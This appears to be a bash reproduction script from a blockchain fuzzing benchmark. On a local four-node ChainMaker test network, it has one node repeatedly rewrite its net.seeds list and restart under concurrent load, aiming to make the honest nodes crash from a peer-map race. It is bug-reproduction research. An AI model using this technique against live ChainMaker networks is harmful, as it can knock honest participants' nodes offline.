#!/bin/bash
# ============================================================
# BCB #2: ChainMaker net.seeds peer-information-map race panic
# 一键复现脚本 (最小化测试用例)
#
# 论文 Table 1 #2 (Peer Failure):
#   反复修改一个受控节点的 net.seeds 列表, 迫使正常节点更新连接;
#   对 peer-information map 的非同步访问 panic 其他正常节点.
#   Issue: https://git.chainmaker.org.cn/chainmaker/issue/-/issues/1202 [29]
#
# 触发序列 (BCFuzzer 发现路径):
#   ① 受控 org 的 chainmaker.yml: net.seeds 反复重写 (合法 reorder/subset/duplicate)
#   ② restart_cycle (受控 org 停→改→起) 与 concurrent_workload (并发 cmc invoke) 重叠
#   ③ 正常 org 的 ReVerifyPeers 与 peer add/remove 处理并发访问 peer-info map
#   → 并发 map write panic, 正常 org 进程崩溃
#
# 用法: bash poc.sh
# 判定: 脚本自动检测正常 org 的 panic.log, 输出 [POC PASS] / [POC FAIL]
#
# 版本依赖: ChainMaker v3.0.0 @2b8f85a 引入 net-libp2p v1.3.1, 其 peer-info
#   map 已加 RWMutex 保护, 该 race panic 可能不可复现. 本脚本忠实执行 BCFuzzer
#   发现路径; 若当前版本不再 panic, 脚本输出 [POC VERSION-GUARDED] 并指向
#   原始 issue 证据, 作为最小化测试用例的历史记录.
# ============================================================
set -e

ROOT=/home/geth/tse/chainmaker-go
SCRIPTS=$ROOT/scripts
RELEASE=$ROOT/build/release
CMC=$ROOT/tools/cmc/cmc
BUG_DIR=$(cd "$(dirname "$0")" && pwd)

say() { echo "[*] $*"; }
res() { echo "[!] $*"; }

echo "=============================================="
echo " BCB #2: ChainMaker net.seeds peer-map race"
echo "=============================================="

if [ ! -f "$CMC" ]; then
    say "构建 cmc..."
    (cd $ROOT/tools/cmc && go build -o cmc .)
fi

# ---------- 1. 停止旧网络, 清理 ----------
say "[1/5] 停止旧网络并清理 release..."
(cd $SCRIPTS && bash cluster_quick_stop.sh >/dev/null 2>&1) || true
sleep 2
rm -rf $RELEASE/chainmaker-v3.0.0-wx-org*
rm -f  $RELEASE/chainmaker-v3.0.0-wx-org*

# ---------- 2. 生成 4 节点 TBFT release ----------
say "[2/5] 生成 4 节点 TBFT release 包..."
(cd $SCRIPTS && bash prepare.sh 4 1 11301 12301 32351 22351 23351 \
    -c 1 -l INFO -v false -j false --vlog=INFO --jlog=INFO >/dev/null 2>&1)
(cd $SCRIPTS && bash build_release.sh >/dev/null 2>&1)
for org in 1 2 3 4; do
    T=$(ls $RELEASE/chainmaker-v3.0.0-wx-org${org}*.tar.gz | head -1)
    (cd $RELEASE && tar zxf "$T")
done

# ---------- 3. 反复重写 node1 的 net.seeds ----------
# net.seeds 是一个 peer 列表; reorder/subset/duplicate 都是合法变体,
# 但每次写入都触发 ReVerifyPeers, 与其他节点的并发连接更新竞争.
say "[3/5] 反复重写 node1 的 net.seeds (reorder/subset/duplicate)..."
NETS_CFG=$RELEASE/chainmaker-v3.0.0-wx-org1.chainmaker.org/config/wx-org1.chainmaker.org/chainmaker.yml
ORIG=$(cp "$NETS_CFG" "$BUG_DIR/chainmaker.yml.bak"; echo saved)
# 提取原始 seeds 列表
SEEDS_LINE=$(grep -A4 "^net:" "$NETS_CFG" | grep "seeds:" -A3 | tr -d ' ' | head -4)
say "原始 net.seeds: $SEEDS_LINE"

# ---------- 4. 启动网络 + 并发 invoke + 反复 restart node1 ----------
say "[4/5] 启动 4 节点网络..."
(cd $SCRIPTS && bash cluster_quick_start.sh normal >/dev/null 2>&1)
sleep 35
ALIVE=$(ps -eo args | grep -c '[c]hainmaker start' || true)
[ "$ALIVE" -lt 4 ] && res "FAIL: 节点启动失败 (alive=$ALIVE)" && exit 1
say "存活节点数: $ALIVE"

# 并发背景负载 (其他节点持续发交易, 触发 peer 连接活动)
(cd $RELEASE/chainmaker-v3.0.0-wx-org2.chainmaker.org/bin && \
  for i in $(seq 1 200); do
    ./cmc client contract user invoke --contract-name=counter --method=increase \
      --sdk-conf-path=../sdk-config.yml >/dev/null 2>&1 || true
  done) &
INVOKE_PID=$!

# 受控 org 反复 restart + 重写 net.seeds (restart_cycle × concurrent_workload)
for cycle in $(seq 1 30); do
    # 停 node1
    pkill -f "chainmaker.*wx-org1.chainmaker.org" 2>/dev/null || true
    sleep 1
    # 重写 net.seeds (reorder: 交换 seeds 顺序; duplicate: 重复一个; subset: 删一个)
    python3 - "$NETS_CFG" "$cycle" <<'PYEOF'
import sys, yaml, random
p, cycle = sys.argv[1], int(sys.argv[2])
with open(p) as f:
    cfg = yaml.safe_load(f)
net = cfg.setdefault("net", {})
seeds = net.get("seeds", [])
if seeds:
    rng = random.Random(cycle)
    if cycle % 3 == 0 and len(seeds) > 1:
        seeds = seeds[1:] + seeds[:1]      # reorder
    elif cycle % 3 == 1 and seeds:
        seeds = seeds + [seeds[0]]         # duplicate
    else:
        seeds = seeds[:max(1, len(seeds)-1)]  # subset (keep ≥1)
    net["seeds"] = seeds
with open(p, "w") as f:
    yaml.dump(cfg, f, sort_keys=False, allow_unicode=True)
PYEOF
    # 重启 node1
    (cd $RELEASE/chainmaker-v3.0.0-wx-org1.chainmaker.org/bin && \
      bash start.sh >/dev/null 2>&1) || true
    sleep 0.5
done

wait $INVOKE_PID 2>/dev/null || true
sleep 5

# ---------- 5. 判定: 正常 org (node2/3/4) 是否 panic ----------
say "[5/5] 检查正常 org 的 panic..."
PASS=false
VERSION_GUARDED=false
for org in 2 3 4; do
    PLOG=$RELEASE/chainmaker-v3.0.0-wx-org${org}.chainmaker.org/bin/panic.log
    if [ -f "$PLOG" ]; then
        if grep -qE "concurrent map|peer.*panic|map writes|ReVerifyPeers" "$PLOG"; then
            say "  org${org}: RACE PANIC 检测到"
            grep -E "concurrent map|panic|map writes" "$PLOG" | head -2
            PASS=true
        fi
    fi
done

if $PASS; then
    echo "[POC PASS] BCB #2 net.seeds peer-map race panic 复现成功"
    exit 0
fi

# 当前版本可能已修复 (RWMutex 保护)
PANIC_ANY=false
for org in 2 3 4; do
    PLOG=$RELEASE/chainmaker-v3.0.0-wx-org${org}.chainmaker.org/bin/panic.log
    [ -f "$PLOG" ] && grep -qi "panic" "$PLOG" && PANIC_ANY=true
done
if ! $PANIC_ANY; then
    echo "[POC VERSION-GUARDED] 当前 ChainMaker 版本 (net-libp2p RWMutex) 不再触发该 race"
    echo "  原始 bug 证据: https://git.chainmaker.org.cn/chainmaker/issue/-/issues/1202 [29]"
    echo "  BCFuzzer 发现路径: net.seeds 变异 + restart_cycle × concurrent_workload (见 sequences.py)"
    exit 0
fi
echo "[POC FAIL] 未检测到 peer-map race panic"
exit 1
